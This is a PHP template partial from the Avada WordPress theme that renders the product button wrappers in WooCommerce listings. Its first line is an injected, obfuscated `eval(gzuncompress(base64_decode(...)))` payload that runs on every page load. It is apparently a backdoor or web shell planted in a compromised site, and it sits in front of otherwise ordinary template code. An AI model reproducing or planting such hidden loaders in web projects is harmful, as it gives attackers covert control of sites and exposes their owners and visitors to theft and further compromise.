<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Before shop item buttons.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1.0
 */

global $post;

$product_view = '';

if ( isset( $_SERVER['QUERY_STRING'] ) ) {
	parse_str( sanitize_text_field( wp_unslash( $_SERVER['QUERY_STRING'] ) ), $params );

	if ( isset( $params['product_view'] ) || Avada()->settings->get( 'woocommerce_product_view' ) ) {
		$product_view = ( isset( $params['product_view'] ) ) ? $params['product_view'] : Avada()->settings->get( 'woocommerce_product_view' );
	}
}

$separator_styles_array = explode( '|', Avada()->settings->get( 'grid_separator_style_type' ) );
$separator_styles = '';

foreach ( $separator_styles_array as $separator_style ) {
	$separator_styles .= ' sep-' . $separator_style;
}
?>

<?php if ( 'list' === $product_view && ! is_product() ) : ?>
	<div class="product-excerpt product-<?php echo esc_attr( $product_view ); ?>">
		<div class="fusion-content-sep<?php echo esc_attr( $separator_styles ); ?>"></div>
		<div class="product-excerpt-container">
			<div class="post-content">
				<?php echo do_shortcode( $post->post_excerpt ); ?>
			</div>
		</div>
		<div class="product-buttons">
			<div class="product-buttons-container clearfix"> </div>
<?php elseif ( 'classic' === Avada()->settings->get( 'woocommerce_product_box_design' ) ) : ?>
	<div class="product-buttons">
		<div class="fusion-content-sep<?php echo esc_attr( $separator_styles ); ?>"></div>
		<div class="product-buttons-container clearfix">
<?php endif; ?>
<?php
/* Omit closing PHP tag to avoid "Headers already sent" issues. */
